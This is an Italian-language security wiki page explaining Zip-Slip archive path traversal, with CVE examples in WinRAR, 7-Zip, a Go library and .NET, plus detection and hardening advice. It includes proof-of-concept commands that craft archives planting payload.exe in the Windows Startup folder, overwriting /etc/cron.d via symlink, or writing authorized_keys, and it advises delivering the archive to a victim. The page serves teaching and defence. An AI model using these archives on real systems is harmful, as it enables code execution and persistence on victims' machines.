# Archive Extraction Path Traversal ("Zip-Slip" / WinRAR CVE-2025-8088)

{{#include ../banners/hacktricks-training.md}}

## Panoramica

Molti formati di archivio (ZIP, RAR, TAR, 7-ZIP, ecc.) consentono a ogni entry di contenere il proprio **percorso interno**. Quando un'utility di estrazione rispetta ciecamente quel percorso, un nome file appositamente creato contenente `..` o un **percorso assoluto** (ad es. `C:\Windows\System32\`) verrà scritto al di fuori della directory scelta dall'utente.
Questa classe di vulnerabilità è ampiamente nota come *Zip-Slip* o **archive extraction path traversal**.<sup>[[6]](#references)</sup>

Le conseguenze variano dalla sovrascrittura arbitraria di file fino a ottenere direttamente la **remote code execution (RCE)** depositando un payload in una posizione di **auto-run**, come la cartella *Startup* di Windows.

## Causa principale

1. L'attacker crea un archivio in cui una o più intestazioni dei file contengono:
* Sequenze di traversal relative (`..\..\..\Users\\victim\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\payload.exe`)
* Percorsi assoluti (`C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\payload.exe`)
* Oppure **symlink** appositamente creati che risolvono al di fuori della directory di destinazione (comune in ZIP/TAR su sistemi *nix*).
2. La vittima estrae l'archivio con uno strumento vulnerabile che si fida del percorso incorporato (o segue i symlink) invece di sanificarlo o forzare l'estrazione all'interno della directory scelta.
3. Il file viene scritto nella posizione controllata dall'attacker ed eseguito/caricato la volta successiva in cui il sistema o l'utente attiva quel percorso.

### Traversal con `.NET` `Path.Combine` + `ZipArchive`

Un anti-pattern comune in .NET consiste nel combinare la destinazione prevista con `ZipArchiveEntry.FullName`, controllato dall'utente, ed eseguire l'estrazione senza la normalizzazione del percorso:<sup>[[4]](#references)</sup>
```csharp
using (var zip = ZipFile.OpenRead(zipPath))
{
foreach (var entry in zip.Entries)
{
var dest = Path.Combine(@"C:\samples\queue\", entry.FullName); // drops base if FullName is absolute
entry.ExtractToFile(dest);
}
}
```
- Se `entry.FullName` inizia con `..\\`, esegue un path traversal; se è un **absolute path**, il componente a sinistra viene completamente scartato, ottenendo un **arbitrary file write** come identità dell'estrazione.
- Archivio proof-of-concept per scrivere in una directory `app` adiacente monitorata da uno scanner pianificato:
```python
import zipfile
with zipfile.ZipFile("slip.zip", "w") as z:
z.writestr("../app/0xdf.txt", "ABCD")
```
L'inserimento di quello ZIP nella inbox monitorata produce `C:\samples\app\0xdf.txt`, dimostrando il traversal al di fuori di `C:\samples\queue\` e abilitando primitive di follow-on (ad esempio, DLL hijacks).

## Esempio nel mondo reale – WinRAR ≤ 7.12 (CVE-2025-8088)

WinRAR per Windows (inclusi la CLI `rar` / `unrar`, la DLL e il source portable) non riusciva a validare i filenames durante l'estrazione.
Un archivio RAR malevolo contenente una entry come:
```text
..\..\..\Users\victim\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\payload.exe
```
finirebbe **al di fuori** della directory di output selezionata e all’interno della cartella *Startup* dell’utente. Dopo il logon, Windows esegue automaticamente tutto ciò che è presente al suo interno, fornendo RCE *persistent*.<sup>[[5]](#references)</sup>

### Creazione di un archivio PoC (Linux/Mac)
```bash
# Requires rar >= 6.x
mkdir -p "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
cp payload.exe "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/"
rar a -ep evil.rar evil/*
```
Opzioni utilizzate:
* `-ep`  – memorizza i percorsi dei file esattamente come forniti (non eliminare i `./` iniziali).

Consegnare `evil.rar` alla vittima e indicarle di estrarlo con una versione vulnerabile di WinRAR.

### Sfruttamento osservato in the Wild

ESET ha segnalato campagne di spear-phishing di RomCom (Storm-0978/UNC2596) che allegavano archivi RAR sfruttando CVE-2025-8088 per distribuire backdoor personalizzate e facilitare operazioni di ransomware.<sup>[[5]](#references)</sup>

## Casi più recenti (2024–2025)

### Traversal di symlink ZIP di 7-Zip → RCE (CVE-2025-11001 / ZDI-25-949)
* **Bug**: le entry ZIP che erano **symbolic links** venivano dereferenziate durante l'estrazione, consentendo agli attaccanti di uscire dalla directory di destinazione e sovrascrivere percorsi arbitrari. L'interazione dell'utente consiste semplicemente nell'*aprire/estrarre* l'archivio.<sup>[[1]](#references)</sup>
* **Vulnerabile**: 7-Zip 21.02–24.09 (build Windows e Linux). Risolto nella versione **25.00** (luglio 2025) e successive.
* **Percorso d'impatto**: sovrascrivere `Start Menu/Programs/Startup` o percorsi utilizzati dai servizi → il codice viene eseguito al login successivo o al riavvio del servizio.
* **PoC rapido (Linux)**:
```bash
mkdir -p out
ln -s /etc/cron.d evil
zip -y exploit.zip evil   # -y preserves symlinks
7z x exploit.zip -o/tmp/target   # vulnerable 7-Zip writes to /etc/cron.d
```
In una build corretta `/etc/cron.d` non verrà modificato; il symlink verrà estratto come link all'interno di `/tmp/target`.

### Zip-Slip di mholt/archiver Unarchive() in Go (CVE-2025-3445)
* **Bug**: `archiver.Unarchive()` segue `../` e le entry ZIP costituite da symlink, scrivendo al di fuori di `outputDir`.<sup>[[2]](#references)</sup>
* **Vulnerabile**: `github.com/mholt/archiver` ≤ 3.5.1 (il progetto è ora deprecated).
* **Fix**: passare a `mholt/archives` ≥ 0.1.0 o implementare controlli sui canonical path prima della scrittura.
* **Riproduzione minima**:
```go
// go test . with archiver<=3.5.1
archiver.Unarchive("exploit.zip", "/tmp/safe")
// exploit.zip holds ../../../../home/user/.ssh/authorized_keys
```

## Suggerimenti per il rilevamento

* **Ispezione statica** – elencare le entry dell'archivio e segnalare qualsiasi nome contenente `../`, `..\\`, *percorsi assoluti* (`/`, `C:`) o entry di tipo *symlink* il cui target si trovi al di fuori della directory di estrazione.
* **Canonicalisation** – assicurarsi che `realpath(join(dest, name))` inizi ancora con `dest`. Rifiutare gli altri casi.<sup>[[3]](#references)</sup>
* **Estrazione in sandbox** – decomprimere in una directory usa e getta usando un extractor *safe* (ad esempio `bsdtar --safe --xattrs --no-same-owner`, 7-Zip ≥ 25.00) e verificare che i percorsi risultanti rimangano all'interno della directory.
* **Monitoraggio degli endpoint** – generare un alert per i nuovi eseguibili scritti nei percorsi `Startup`/`Run`/`cron` poco dopo l'apertura di un archivio tramite WinRAR/7-Zip/ecc.

## Mitigazione e hardening

1. **Aggiornare l'extractor** – WinRAR 7.13+ e 7-Zip 25.00+ implementano la sanitizzazione dei percorsi e dei symlink. Entrambi gli strumenti non dispongono comunque di auto-update.
2. Estrarre gli archivi con “**Do not extract paths**” / “**Ignore paths**” quando possibile.
3. Su Unix, ridurre i privilegi e montare un **chroot/namespace** prima dell'estrazione; su Windows, utilizzare **AppContainer** o una sandbox.
4. Se si scrive codice personalizzato, normalizzare con `realpath()`/`PathCanonicalize()` **prima** di creare/scrivere e rifiutare qualsiasi entry che esca dalla destinazione.

## Altri casi storici / interessati

* 2018 – Advisory *Zip-Slip* su larga scala di Snyk, che interessava numerose librerie Java/Go/JS.<sup>[[6]](#references)</sup>
* 2023 – 7-Zip CVE-2023-4011, traversal simile durante il merge `-ao`.
* 2025 – `go-slug` di HashiCorp (CVE-2025-0377), traversal durante l'estrazione TAR negli slug (patch nella v1.2).<sup>[[7]](#references)</sup>
* Qualsiasi logica di estrazione personalizzata che non esegua `PathCanonicalize` / `realpath` prima della scrittura.

## Riferimenti

- [1] [Trend Micro ZDI-25-949 – 7-Zip symlink ZIP traversal (CVE-2025-11001)](https://www.zerodayinitiative.com/advisories/ZDI-25-949/)
- [2] [JFrog Research – mholt/archiver Zip-Slip (CVE-2025-3445)](https://research.jfrog.com/vulnerabilities/archiver-zip-slip/)
- [3] [Meziantou – Prevent Zip Slip in .NET](https://www.meziantou.net/prevent-zip-slip-in-dotnet.htm)
- [4] [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [5] [ESET Research – Update WinRAR tools now: RomCom and others exploiting zero-day vulnerability (CVE-2025-8088)](https://www.welivesecurity.com/en/eset-research/update-winrar-tools-now-romcom-and-others-exploiting-zero-day-vulnerability/)
- [6] [Snyk – Public Disclosure of a Critical Arbitrary File Overwrite Vulnerability: Zip Slip](https://snyk.io/blog/zip-slip-vulnerability/)
- [7] [HashiCorp – HCSEC-2025-01: go-slug Vulnerable to Zip Slip Attack (CVE-2025-0377)](https://discuss.hashicorp.com/t/hcsec-2025-01-hashicorp-go-slug-vulnerable-to-zip-slip-attack/72719)

{{#include ../banners/hacktricks-training.md}}
